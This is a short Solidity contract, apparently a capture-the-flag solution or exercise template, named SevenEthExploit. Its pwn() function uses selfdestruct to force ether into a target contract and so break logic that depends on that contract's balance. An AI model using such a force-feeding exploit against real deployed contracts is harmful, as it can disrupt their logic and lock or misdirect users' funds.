// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract SevenEthExploit {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function pwn() external payable {
        // write your code here
        selfdestruct(payable(target));
    }
}